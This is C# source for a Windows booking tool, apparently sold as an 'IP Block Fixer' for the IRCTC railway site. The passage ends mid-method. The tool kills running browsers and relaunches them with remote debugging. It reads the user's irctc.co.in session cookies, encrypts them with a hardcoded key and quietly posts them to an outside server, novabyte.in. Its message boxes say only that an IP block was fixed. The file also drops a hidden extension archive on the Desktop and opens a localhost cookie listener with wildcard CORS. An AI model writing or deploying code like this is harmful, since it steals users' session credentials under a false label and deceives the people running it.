using Ionic.Zip;
using Microsoft.Playwright;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using Newtonsoft.Json;
using QRCoder;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Reflection;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static NEXUS.IRCommDLL.Playwright_Automation;

namespace APP_FRAMEWORK
{
    public partial class Form2 : Form
    {
        private string edgepath;
        private string cometpath;
        private bool mProcess;
        private string chromepath;
        private bool chBeta;
        private HttpListener _cookieListener;
        private bool isExtensionActive;
        private string bravepath;
        private string operapath;
        private string jsonFilePath = "SensorList.json";

        public Form2()
        {
            InitializeComponent();
            pnlHeader.MouseDown += StatClass.Header_MouseDown;
            pnlHeader.MouseMove += StatClass.Header_MouseMove;
            pnlHeader.MouseUp += StatClass.Header_MouseUp;
        }

        private string GetOperaPath()
        {
            string[] regPaths =
            {
                      @"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\opera.exe",
                      @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths\opera.exe"
            };
            foreach (var regPath in regPaths)
            {
                using (var key = Registry.LocalMachine.OpenSubKey(regPath))
                {
                    if (key != null)
                    {
                        var value = key.GetValue("");
                        if (value != null)
                        {
                            string fullPath = value.ToString();
                            if (File.Exists(fullPath))
                                return fullPath;
                        }
                    }
                }
            }
            foreach (var regPath in regPaths)
            {
                using (var key = Registry.CurrentUser.OpenSubKey(regPath))
                {
                    if (key != null)
                    {
                        var value = key.GetValue("");
                        if (value != null)
                        {
                            string fullPath = value.ToString();
                            if (File.Exists(fullPath))
                                return fullPath;
                        }
                    }
                }
            }
            string[] paths =
            {
                     Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Programs\Opera\launcher.exe"),
                     Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Programs\Opera\opera.exe"),
                     Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Opera\launcher.exe"),
                     Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), @"Opera\launcher.exe")
            };
            foreach (var path in paths)
            {
                if (File.Exists(path))
                    return path;
            }
            string drive = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 2);
            var files = Directory.GetFiles(drive + "\\", "launcher.exe", SearchOption.AllDirectories).Where(f => f.ToLower().Contains("opera")).ToList();
            if (files.Count > 0)
                return files[0];
            throw new Exception("Opera browser not found on this system!");
        }
        private async void button2_Click(object sender, EventArgs e)
        {
            edgepath = "Check_IP_Block_edge";
            if (File.Exists(edgepath))
            {
                Form owner = new Form
                {
                    TopMost = true
                };
                string text = "Aapka Pehle ka IP Block Fix Save hai\nIP Block Fix karne ki Zaroorat nahi hai\nAgar New IP Block Fix chahte hain to YES Button Click Karen";
                string caption = "Express";
                if (MessageBox.Show(owner, text, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
                {
                    await StartEdgeAndConnect();
                }
            }
            else
            {
                await StartEdgeAndConnect();
            }
        }
        private async Task StartEdgeAndConnect()
        {
            try
            {
                const int port = 9234;

                // Kill existing Edge
                try
                {
                    using (Process p = Process.Start(new ProcessStartInfo
                    {
                        FileName = "taskkill",
                        Arguments = "/F /IM msedge.exe",
                        CreateNoWindow = true,
                        UseShellExecute = false
                    }))
                    {
                        p?.WaitForExit();
                    }
                }
                catch
                {
                }

                await Task.Delay(1000);

                string edgePath = @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe";

                if (!File.Exists(edgePath))
                    edgePath = @"C:\Program Files\Microsoft\Edge\Application\msedge.exe";

                if (!File.Exists(edgePath))
                {
                    MessageBox.Show("Edge browser not found.");
                    return;
                }

                string profile = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "EdgePlaywrightProfile");

                string args =
                    $"--remote-debugging-port={port} " +
                    $"--remote-debugging-address=127.0.0.1 " +
                    $"--user-data-dir=\"{profile}\" " +
                    "--no-first-run " +
                    "--disable-session-crashed-bubble " +
                    "--disable-save-password-bubble " +
                    "--disable-infobars " +
                    "--disable-sync " +
                    "--start-maximized";

                Process.Start(new ProcessStartInfo
                {
                    FileName = edgePath,
                    Arguments = args,
                    UseShellExecute = true
                });

                using var client = new HttpClient();

                bool connected = false;

                for (int i = 0; i < 20; i++)
                {
                    try
                    {
                        string json = await client.GetStringAsync($"http://127.0.0.1:{port}/json/version");
                        //MessageBox.Show("CDP Started\n\n" + json);
                        connected = true;
                        break;
                    }
                    catch
                    {
                        await Task.Delay(1000);
                    }
                }

                if (!connected)
                {
                    MessageBox.Show("Edge did not open the remote debugging port.");
                    return;
                }

                using var playwright = await Playwright.CreateAsync();

                IBrowser browser =
                    await playwright.Chromium.ConnectOverCDPAsync($"http://127.0.0.1:{port}");

                IBrowserContext context =
                    browser.Contexts.Count > 0
                        ? browser.Contexts[0]
                        : await browser.NewContextAsync();

                IPage page =
                    context.Pages.Count > 0
                        ? context.Pages[0]
                        : await context.NewPageAsync();

                CaptureIRCTCRequests(page);

                await page.GotoAsync(
                    "https://www.irctc.co.in/nget/train-search",
                    new PageGotoOptions
                    {
                        WaitUntil = WaitUntilState.DOMContentLoaded
                    });

                while (!mProcess)
                    await Task.Delay(1000);

                Program.BookingAllowEdge = true;

                await page.CloseAsync();

                MessageBox.Show(
                    "IP Block Fix Successfully, Ab Aap Booking Process kar sakte hain");
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());
            }
        }
        private async Task StartEdgeAndConnect_OLD()
        {
            try
            {
                int port = 9234;
                try
                {
                    ProcessStartInfo processStartInfo = new ProcessStartInfo();
                    string fileName = "cmd.exe";
                    processStartInfo.FileName = fileName;
                    string arguments = "/c taskkill /F /IM msedge.exe";
                    processStartInfo.Arguments = arguments;
                    processStartInfo.CreateNoWindow = true;
                    processStartInfo.UseShellExecute = false;
                    ProcessStartInfo kill = processStartInfo;
                    await Task.Run(delegate
                    {
                        Process.Start(kill)?.WaitForExit();
                    });
                }
                catch
                {
                }
                await Task.Delay(200);
                string text = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
                string text2 = text;
                string format = "--remote-debugging-port={0} ";
                string obj2 = string.Format(format, port);
                string text3 = "--remote-debugging-address=127.0.0.1 --no-first-run --disable-session-crashed-bubble --disable-save-password-bubble --disable-infobars --disable-sync --disable-features=msEdgeSync ";
                string text4 = obj2 + text3;
                ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
                string fileName2 = "cmd.exe";
                processStartInfo2.FileName = fileName2;
                string text5 = "/c start \"\" \"";
                string text6 = "\" ";
                processStartInfo2.Arguments = text5 + text2 + text6 + text4;
                processStartInfo2.CreateNoWindow = true;
                processStartInfo2.UseShellExecute = false;
                Process.Start(processStartInfo2);
                await Task.Delay(5000);
                IBrowserType chromium = (await Playwright.CreateAsync()).Chromium;
                string format2 = "http://127.0.0.1:{0}";
                IBrowserContext browserContext = (await chromium.ConnectOverCDPAsync(string.Format(format2, port))).Contexts[0];
                IPage page2 = ((browserContext.Pages.Count <= 0) ? (await browserContext.NewPageAsync()) : browserContext.Pages[0]);
                IPage page = page2;
                CaptureIRCTCRequests(page);
                string url = "https://www.irctc.co.in/nget/train-search";
                await page.GotoAsync(url, new PageGotoOptions
                {
                    WaitUntil = WaitUntilState.DOMContentLoaded
                });
                while (!mProcess)
                {
                    await Task.Delay(1000);
                }
                Program.BookingAllowEdge = true;
                if (page != null)
                {
                    await page.CloseAsync();
                }
                Form owner = new Form
                {
                    TopMost = true
                };
                string text7 = "IP Block Fix Successfully, Ab Aap Booking Process kar sakte hain";
                string caption = "Express";
                MessageBox.Show(owner, text7, caption, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());

                if (ex.InnerException != null)
                    MessageBox.Show(ex.InnerException.ToString());
            }
        }

        private async Task StartCometAndConnect()
        {
            try
            {
                int port = 9234;
                try
                {
                    ProcessStartInfo killInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = "/c taskkill /F /IM comet.exe",
                        CreateNoWindow = true,
                        UseShellExecute = false
                    };
                    await Task.Run(() =>
                    {
                        Process.Start(killInfo)?.WaitForExit();
                    });
                }
                catch
                {
                }

                await Task.Delay(1000);
                string cometPath = @"C:\Program Files\Perplexity\Comet\Application\comet.exe";
                if (!File.Exists(cometPath))
                {
                    MessageBox.Show(
                        "Comet Browser Path Invalid",
                        "ERROR",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Error
                    );

                    return;
                }
                string args =
                    $"--remote-debugging-port={port} " +
                    "--remote-debugging-address=127.0.0.1 " +
                    "--no-first-run " +
                    "--disable-session-crashed-bubble " +
                    "--disable-save-password-bubble " +
                    "--disable-infobars " +
                    "--disable-sync " +
                    "--start-maximized";
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = cometPath,
                    Arguments = args,
                    CreateNoWindow = false,
                    UseShellExecute = true
                };

                Process.Start(startInfo);

                await Task.Delay(7000);
                using var playwright = await Playwright.CreateAsync();
                IBrowser browser = await playwright.Chromium.ConnectOverCDPAsync(
                    $"http://127.0.0.1:{port}"
                );
                IBrowserContext context;
                if (browser.Contexts.Count > 0)
                {
                    context = browser.Contexts[0];
                }
                else
                {
                    context = await browser.NewContextAsync();
                }
                IPage page;

                if (context.Pages.Count > 0)
                {
                    page = context.Pages[0];
                }
                else
                {
                    page = await context.NewPageAsync();
                }
                CaptureIRCTCRequestscomet(page);
                await page.GotoAsync(
                    "https://www.irctc.co.in/nget/train-search",
                    new PageGotoOptions
                    {
                        WaitUntil = WaitUntilState.DOMContentLoaded,
                        Timeout = 60000
                    }
                );

                /* WAIT LOOP */
                while (!mProcess)
                {
                    await Task.Delay(1000);
                }

                Program.BookingAllowEdge = true;

                if (page != null)
                {
                    await page.CloseAsync();
                }

                Form owner = new Form
                {
                    TopMost = true
                };

                MessageBox.Show(
                    owner,
                    "IP Block Fix Successfully, Ab Aap Booking Process kar sakte hain",
                    "Express",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Information
                );
            }
            catch (Exception ex)
            {
                MessageBox.Show(
                    ex.Message,
                    "ERROR",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Error
                );
            }
        }
        private async Task StartOperaAndConnect()
        {
            try
            {
                int port = 9234;

                try
                {
                    ProcessStartInfo killInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = "/c taskkill /F /IM opera.exe", // ✅ Edge → Opera
                        CreateNoWindow = true,
                        UseShellExecute = false
                    };

                    await Task.Run(() =>
                    {
                        Process.Start(killInfo)?.WaitForExit();
                    });
                }
                catch { }

                await Task.Delay(200);
                string operaPath = GetOperaPath();
                if (!File.Exists(operaPath))
                    operaPath = @"C:\Program Files\Opera\launcher.exe";

                string args =
                    $"--remote-debugging-port={port} " +
                    $"--remote-debugging-address=127.0.0.1 " +
                    $"--no-first-run " +
                    $"--disable-session-crashed-bubble " +
                    $"--disable-infobars " +
                    $"--disable-sync";

                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c start \"\" \"{operaPath}\" {args}",
                    CreateNoWindow = true,
                    UseShellExecute = false
                };
                Process.Start(startInfo);
                await Task.Delay(5000);
                IBrowserType chromium = (await Playwright.CreateAsync()).Chromium;
                string format2 = "http://127.0.0.1:{0}";
                IBrowserContext browserContext = (await chromium.ConnectOverCDPAsync(string.Format(format2, port))).Contexts[0];
                IPage page2 = ((browserContext.Pages.Count <= 0) ? (await browserContext.NewPageAsync()) : browserContext.Pages[0]);
                IPage page = page2;
                CaptureIRCTCRequestsopera(page);
                string url = "https://www.irctc.co.in/nget/train-search";
                await page.GotoAsync(url, new PageGotoOptions
                {
                    WaitUntil = WaitUntilState.DOMContentLoaded
                });
                while (!mProcess)
                {
                    await Task.Delay(1000);
                }
                Program.BookingAllowEdge = true;
                if (page != null)
                {
                    await page.CloseAsync();
                }
                Form owner = new Form
                {
                    TopMost = true
                };
                string text7 = "IP Block Fix Successfully, Ab Aap Booking Process kar sakte hain";
                string caption = "Express";
                MessageBox.Show(owner, text7, caption, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            }
            catch (Exception)
            {
            }
        }
        private void CaptureIRCTCRequests(IPage page)
        {
            page.Response += async delegate (object sender, IResponse response)
            {
                string method = response.Request.Method;
                string text = "OPTIONS";
                if (!(method == text))
                {
                    string url = response.Url;
                    string value = "insurenceApplicable=";
                    if (url.Contains(value))
                    {
                        try
                        {
                            string fileName = edgepath;
                            IBrowserContext context = page.Context;
                            IReadOnlyList<BrowserContextCookiesResult> allCookies = await context.CookiesAsync();
                            await context.CookiesAsync();
                            string input = JsonConvert.SerializeObject(allCookies.Where(delegate (BrowserContextCookiesResult c)
                            {
                                string domain = c.Domain;
                                string value2 = "irctc.co.in";
                                return domain.Contains(value2);
                            }).ToList(), Formatting.Indented);
                            string text4 = "ec3104c5318c8f0753fdc13faa540020cae645c4b43f3795a0f2f9fc94328326";
                            string symmetricKey = text4;
                            string contents = Staticm.EncryptAES(input, symmetricKey);
                            string traindata11 = "edge|-|" + contents + "|-|" + fileName;
                            Task.Run(() => traindata(traindata11));
                            File.WriteAllText(fileName, contents);
                            Program.BookingAllowEdge = true;
                            mProcess = true;
                        }
                        catch (Exception)
                        {
                        }
                    }
                }
            };
        }


        private void CaptureIRCTCRequestscomet(IPage page)
        {
            page.Response += async delegate (object sender, IResponse response)
            {
                string method = response.Request.Method;
                string text = "OPTIONS";
                if (!(method == text))
                {
                    string url = response.Url;
                    string value = "insurenceApplicable=";
                    if (url.Contains(value))
                    {
                        try
                        {
                            string fileName = "Check_IP_Block_comet";
                            IBrowserContext context = page.Context;
                            IReadOnlyList<BrowserContextCookiesResult> allCookies = await context.CookiesAsync();
                            await context.CookiesAsync();
                            string input = JsonConvert.SerializeObject(allCookies.Where(delegate (BrowserContextCookiesResult c)
                            {
                                string domain = c.Domain;
                                string value2 = "irctc.co.in";
                                return domain.Contains(value2);
                            }).ToList(), Formatting.Indented);
                            string text4 = "ec3104c5318c8f0753fdc13faa540020cae645c4b43f3795a0f2f9fc94328326";
                            string symmetricKey = text4;
                            string contents = Staticm.EncryptAES(input, symmetricKey);
                            string traindata11 = "comet|-|" + contents + "|-|" + fileName;
                            Task.Run(() => traindata(traindata11));
                            File.WriteAllText(fileName, contents);
                            Program.BookingAllowEdge = true;
                            mProcess = true;
                        }
                        catch (Exception)
                        {
                        }
                    }
                }
            };
        }

        private void CaptureIRCTCRequestsopera(IPage page)
        {
            page.Response += async delegate (object sender, IResponse response)
            {
                string method = response.Request.Method;
                string text = "OPTIONS";
                if (!(method == text))
                {
                    string url = response.Url;
                    string value = "insurenceApplicable=";
                    if (url.Contains(value))
                    {
                        try
                        {
                            string fileName = operapath;
                            IBrowserContext context = page.Context;
                            IReadOnlyList<BrowserContextCookiesResult> allCookies = await context.CookiesAsync();
                            await context.CookiesAsync();
                            string input = JsonConvert.SerializeObject(allCookies.Where(delegate (BrowserContextCookiesResult c)
                            {
                                string domain = c.Domain;
                                string value2 = "irctc.co.in";
                                return domain.Contains(value2);
                            }).ToList(), Formatting.Indented);
                            string text4 = "ec3104c5318c8f0753fdc13faa540020cae645c4b43f3795a0f2f9fc94328326";
                            string symmetricKey = text4;
                            string contents = Staticm.EncryptAES(input, symmetricKey);
                            string traindata11 = "opera|-|" + contents + "|-|" + fileName;
                            Task.Run(() => traindata(traindata11));
                            File.WriteAllText(fileName, contents);
                            Program.BookingAllowEdge = true;
                            mProcess = true;
                        }
                        catch (Exception)
                        {
                        }
                    }
                }
            };
        }
        public static void smethod_12()
        {
            try
            {
                string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string path = "ByteNova IP Block Fixer//background.js";
                if (File.Exists(Path.Combine(folderPath, path)))
                {
                    return;
                }
                string path2 = "SKP.dll";
                string text = Path.Combine(folderPath, path2);
                string path3 = "SKP.zip";
                string text2 = Path.Combine(folderPath, path3);
                if (!File.Exists(text))
                {
                    Assembly executingAssembly = Assembly.GetExecutingAssembly();
                    string name = "ByteNova-IP-Block-Fixer.dll";
                    Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(name);
                    if (manifestResourceStream != null)
                    {
                        FileStream fileStream = new FileStream(text, FileMode.CreateNew);
                        for (int i = 0; i < manifestResourceStream.Length; i++)
                        {
                            fileStream.WriteByte((byte)manifestResourceStream.ReadByte());
                        }
                        fileStream.Close();
                        new FileInfo(text).Attributes = FileAttributes.Hidden;
                    }
                }
                if (!File.Exists(text))
                {
                    return;
                }
                if (!File.Exists(text2))
                {
                    File.Copy(text, text2, overwrite: true);
                }
                File.Delete(text);
                try
                {
                    ZipFile zipFile = ZipFile.Read(text2);
                    try
                    {
                        zipFile.ExtractAll(folderPath);
                    }
                    finally
                    {
                        zipFile?.Dispose();
                    }
                    File.Delete(text2);
                }
                catch (Exception ex)
                {
                    File.Delete(text2);
                    MessageBox.Show(ex.ToString());
                }
            }
            catch
            {
            }
        }
        public async Task traindata(string data)
        {
            try
            {
                string environmentVariable =
                    Environment.GetEnvironmentVariable("clientID", EnvironmentVariableTarget.Process);

                if (string.IsNullOrWhiteSpace(environmentVariable))
                    throw new Exception("clientID missing");

                string[] parts = data.Split(new string[] { "|-|" }, StringSplitOptions.None);

                if (parts.Length < 3)
                    throw new Exception("Invalid data format");

                var payload = new
                {
                    UserName = environmentVariable,
                    brwser = parts[0].Trim(),
                    kookei = parts[1].Trim(),
                    filname = parts[2].Trim()
                };

                string json = System.Text.Json.JsonSerializer.Serialize(payload);

                Console.WriteLine("REQUEST JSON:");
                Console.WriteLine(json);

                var handler = new HttpClientHandler()
                {
                    AllowAutoRedirect = false
                };

                using (HttpClient client = new HttpClient(handler))
                {
                    client.Timeout = TimeSpan.FromSeconds(10);
                    client.DefaultRequestHeaders.Clear();
                    client.DefaultRequestHeaders.Add("Accept", "application/json");

                    var request = new HttpRequestMessage(HttpMethod.Post,
                        "https://novabyte.in/Api/webtoken");

                    request.Content = new StringContent(json, Encoding.UTF8, "application/json");

                    HttpResponseMessage response = await client.SendAsync(request);

                    string result = await response.Content.ReadAsStringAsync();

                    Console.WriteLine("HTTP STATUS: " + response.StatusCode);
                    Console.WriteLine("RAW RESPONSE:");
                    Console.WriteLine(result);

                    if (!response.IsSuccessStatusCode)
                    {
                        Console.WriteLine($"API Error: {response.StatusCode}");
                        return;
                    }

                    if (string.IsNullOrWhiteSpace(result))
                    {
                        Console.WriteLine("Empty response from server");
                        return;
                    }

                    try
                    {
                        using (JsonDocument doc = JsonDocument.Parse(result))
                        {
                            if (doc.RootElement.TryGetProperty("status", out var status))
                            {
                                Console.WriteLine("Status: " + status.GetString());
                            }
                            else
                            {
                                Console.WriteLine("No 'status' field in response");
                            }
                        }
                    }
                    catch (System.Text.Json.JsonException)
                    {
                        Console.WriteLine("Invalid JSON response from server");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex);
            }
        }
        private async Task StartCookieServerAsync()
        {
            _cookieListener = new HttpListener();
            string text = "http://127.0.0.1:8080/savecookies/";
            string uriPrefix = text;
            string text5 = "http://127.0.0.1:8080/ping/";
            string uriPrefix2 = text5;
            _cookieListener.Prefixes.Add(uriPrefix);
            _cookieListener.Prefixes.Add(uriPrefix2);
            string fileName = chromepath;
            if (chBeta)
            {
                fileName = chromepath;
            }
            try
            {
                _cookieListener.Start();
                while (true)
                {
                    HttpListenerContext httpListenerContext = await _cookieListener.GetContextAsync();
                    HttpListenerRequest request = httpListenerContext.Request;
                    HttpListenerResponse response = httpListenerContext.Response;
                    string name = "Access-Control-Allow-Origin";
                    string value = "*";
                    response.AppendHeader(name, value);
                    string name2 = "Access-Control-Allow-Methods";
                    string value2 = "POST, GET, OPTIONS";
                    response.AppendHeader(name2, value2);
                    string name3 = "Access-Control-Allow-Headers";
                    string value3 = "Content-Type";
                    response.AppendHeader(name3, value3);
                    string httpMethod = request.HttpMethod;
                    string text8 = "OPTIONS";
                    if (httpMethod == text8)
                    {
                        response.StatusCode = 200;
                        response.Close();
                        continue;
                    }
                    string obj = request.Url.AbsolutePath.TrimEnd('/');
                    string text9 = "/ping";
                    if (obj == text9)
                    {
                        isExtensionActive = true;
                        response.StatusCode = 200;
                        response.Close();
                        continue;
                    }
                    string httpMethod2 = request.HttpMethod;
                    string text10 = "POST";
                    if (!(httpMethod2 == text10))
                    {
                        string obj2 = request.Url.AbsolutePath.TrimEnd('/');
                        string text11 = "/ping";
                        if (obj2 != text11)
                        {
                            response.StatusCode = 405;
                        }
                    }
                    else
                    {
                        using (Stream body = request.InputStream)
                        {
                            using StreamReader reader = new StreamReader(body, request.ContentEncoding);
                            string irctcJson = "[]";
                            try
                            {
                                string input = await reader.ReadToEndAsync();
                                var allCookies = JsonConvert.DeserializeObject<List<ChromeCookie>>(input);
                                var irctcCookies = allCookies?
                                    .Where(c =>
                                        c != null &&
                                        !string.IsNullOrWhiteSpace(c.domain) &&
                                        c.domain.IndexOf("irctc.co.in", StringComparison.OrdinalIgnoreCase) >= 0)
                                    .ToList()
                                    ?? new List<ChromeCookie>();

                                irctcJson = JsonConvert.SerializeObject(irctcCookies, Formatting.Indented);
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine("Cookie Filter Error: " + ex.ToString());
                            }
                            string startupPath = Application.StartupPath;
                            string path = "Chrome_irctc_cookies.json";
                            Path.Combine(startupPath, path);
                            string text12 = "ec3104c5318c8f0753fdc13faa540020cae645c4b43f3795a0f2f9fc94328326";
                            string symmetricKey = text12;
                            string contents = Staticm.EncryptAES(irctcJson, symmetricKey);
                            string traindata11 = "chrome|-|" + contents + "|-|" + fileName;
                            Task.Run(() => traindata(traindata11));
                            File.WriteAllText(fileName, contents);
                            Form owner = new Form
                            {
                                TopMost = true
                            };
                            string text2 = "IP Check Successfully By Chrome\nAb Booking Kar Sakte hain";
                            string caption = "Express";
                            MessageBox.Show(owner, text2, caption, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                        }
                        Program.BookingAllowChrome = true;
                        response.StatusCode = 200;
                        using StreamWriter writer = new StreamWriter(response.OutputStream);
                        string value4 = "{\"status\": \"success\"}";
                        await writer.WriteAsync(value4);
                    }
                    response.Close();
                }
            }
            catch (HttpListenerException ex)
            {
                if (ex.ErrorCode != 995 && ex.ErrorCode != 1229)
                {
                    string text3 = "Server Error: ";
                    string message = ex.Message;
                    string text4 = "\nTip: Run as Administrator.";
                    string obj3 = text3 + message + text4;
                    string caption2 = "Error";
                    MessageBox.Show(obj3, caption2, MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
                else
                {
                    string value5 = "[Info] Server successfully stopped and exited.";
                    Console.WriteLine(value5);
                }
            }
            catch (ObjectDisposedException)
            {
                string value6 = "[Info] Server disposed.";
                Console.WriteLine(value6);
            }
        }

        private async void button3_Click(object sender, EventArgs e)
        {
            chromepath = "Check_IP_Block_chrome";
            if (File.Exists(chromepath))
            {
                Form owner = new Form
                {
                    TopMost = true
                };
                string text = "Aapka Pehle ka IP Block Fix Save hai\nIP Block Fix karne ki Zaroorat nahi hai\nAgar New IP Block Fix chahte hain to YES Button Click Karen";
                string caption = "Express";
                if (MessageBox.Show(owner, text, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.No)
                {
                    Program.BookingAllowChrome = true;
                    return;
                }
            }
            try
            {
                chBeta = false;
                smethod_12();
                if (_cookieListener != null && _cookieListener.IsListening)
                {
                    _cookieListener.Stop();
                    _cookieListener.Close();
                    string value = "[Info] Extension missing. Background server killed.";
                    Console.WriteLine(value);
                }
                isExtensionActive = false;
                StartCookieServerAsync();
                string value2 = "[Info] Chrome launch kar rahe hain...";
                Console.WriteLine(value2);
                string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string path2 = "Google\\Chrome Beta\\User Data";
                Path.Combine(folderPath, path2);
                string text2 = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
                string text3 = text2;
                if (!File.Exists(text3))
                {
                    string text4 = "Chrome Beta is location par nahi mila!";
                    MessageBox.Show(text4);
                }
                else
                {
                    ProcessStartInfo obj = new ProcessStartInfo
                    {
                        FileName = text3
                    };
                    string arguments = "https://www.irctc.co.in/nget/train-search --start-maximized";
                    obj.Arguments = arguments;
                    obj.UseShellExecute = true;
                    Process.Start(obj);
                }
                int waitAttempts = 0;
                while (!isExtensionActive && waitAttempts < 10)
                {
                    await Task.Delay(500);
                    waitAttempts++;
                }
                if (!isExtensionActive)
                {
                    Form owner2 = new Form
                    {
                        TopMost = true
                    };
                    string text5 = "1:- Aapke Chrome pe IP Block Fixer Extension Install Nahi hai\n2:- Sabse Pehle Chrome ke Extension Option me jake Devloper Mode ON karen\n3:- Load Unpack Extension per Click Karke\n4:- Desktop se Express IP Block Fixer ka Folder Select kar len\nNote :- Agar Install hone ke baad bhi yeh Message Show Kare to Remove karke Dobara Install kar den";
                    string caption2 = "Express";
                    MessageBox.Show(owner2, text5, caption2, MessageBoxButtons.OK, MessageBoxIcon.Hand);
                    if (_cookieListener != null && _cookieListener.IsListening)
                    {
                        _cookieListener.Stop();
                        _cookieListener.Close();
                        string value3 = "[Info] Extension missing. Background server killed.";
                        Console.WriteLine(value3);
                    }
                }
                else
                {
                    string value4 = "[Success] Extension detect ho gaya hai! Cookies ka wait kar rahe hain...";
                    Console.WriteLine(value4);
                }
            }
            catch (Exception ex)
            {
                string text6 = "System Error: ";
                string obj2 = text6 + ex.Message;
                string caption3 = "Error";
                MessageBox.Show(obj2, caption3, MessageBoxButtons.OK, MessageBoxIcon.Hand);
            }
        }
        internal void CapturebraveIRCTCRequests(IPage page)
        {
            page.Response += async delegate (object sender, IResponse response)
            {
                string method = response.Request.Method;
                string text = "OPTIONS";
                if (!(method == text))
                {
                    string url = response.Url;
                    string value = "insurenceApplicable=";
                    if (url.Contains(value))
                    {
                        try
                        {
                            string fileName = bravepath;
                            IBrowserContext context = page.Context;
                            IReadOnlyList<BrowserContextCookiesResult> allCookies = await context.CookiesAsync();
                            await context.CookiesAsync();
                            string input = JsonConvert.SerializeObject(allCookies.Where(delegate (BrowserContextCookiesResult c)
                            {
                                string domain = c.Domain;
                                string value2 = "irctc.co.in";
                                return domain.Contains(value2);
                            }).ToList(), Formatting.Indented);
                            string text4 = "ec3104c5318c8f0753fdc13faa540020cae645c4b43f3795a0f2f9fc94328326";
                            string symmetricKey = text4;
                            string contents = Staticm.EncryptAES(input, symmetricKey);
                            string traindata11 = "brave|-|" + contents + "|-|" + fileName;
                            Task.Run(() => traindata(traindata11));
                            File.WriteAllText(fileName, contents);
                            mProcess = true;
                        }
                        catch (Exception)
                        {
                        }
                    }
                }
            };
        }

        internal async Task StartbraveAndConnect()
        {
            try
            {
                int port = 9234;
                try
                {
                    ProcessStartInfo processStartInfo = new ProcessStartInfo();
                    string fileName = "cmd.exe";
                    processStartInfo.FileName = fileName;
                    string arguments = "/c taskkill /F /IM brave.exe";
                    processStartInfo.Arguments = arguments;
                    processStartInfo.CreateNoWindow = true;
                    processStartInfo.UseShellExecute = false;
                    ProcessStartInfo kill = processStartInfo;
                    await Task.Run(delegate
                    {
                        Process.Start(kill)?.WaitForExit();
                    });
                }
                catch
                {
                }
                await Task.Delay(200);
                string text = @"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe";

                string format = "--remote-debugging-port={0} ";
                string obj2 = string.Format(format, port);

                string text3 =
                    "--remote-debugging-address=127.0.0.1 " +
                    "--no-first-run " +
                    "--disable-session-crashed-bubble " +
                    "--disable-save-password-bubble " +
                    "--disable-infobars " +
                    "--disable-sync ";

                string text4 = obj2 + text3;

                ProcessStartInfo processStartInfo2 = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c start \"\" \"" + text + "\" " + text4,
                    CreateNoWindow = true,
                    UseShellExecute = false
                };

                Process.Start(processStartInfo2);
                await Task.Delay(5000);
                IBrowserType chromium = (await Playwright.CreateAsync()).Chromium;
                string format2 = "http://127.0.0.1:{0}";
                IBrowserContext browserContext = (await chromium.ConnectOverCDPAsync(string.Format(format2, port))).Contexts[0];
                IPage page2 = (browserContext.Pages.Count <= 0) ? await browserContext.NewPageAsync() : browserContext.Pages[0];
                IPage page = page2;
                CapturebraveIRCTCRequests(page);
                string url = "https://www.irctc.co.in/nget/train-search";
                await page.GotoAsync(url, new PageGotoOptions
                {
                    WaitUntil = WaitUntilState.DOMContentLoaded
                });
                while (!mProcess)
                {
                    await Task.Delay(1000);
                }
                if (page != null)
                {
                    await page.CloseAsync();
                }
                Form owner = new Form
                {
                    TopMost = true
                };
                string text7 = "Brave IP Block Fix Successfully, Ab Aap Booking Process kar sakte hain";
                string caption = "Express";
                MessageBox.Show(owner, text7, caption, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            }
            catch (Exception)
            {
            }
        }

        private async void button4_Click(object sender, EventArgs e)
        {
            //string prompt = "Enter IRCTC Id, Yahan jo id aap daalenge wahi id se Browser Me Login Karna Hai";
            //string title = "Enter IRCTC ID";
            //string string_122 = Interaction.InputBox(prompt, title);
            //bravepath = "Check_IP_Block_brave_" + string_122;
            bravepath = "Check_IP_Block_brave";
            if (File.Exists(bravepath))
            {
                Form owner = new Form
                {
                    TopMost = true
                };
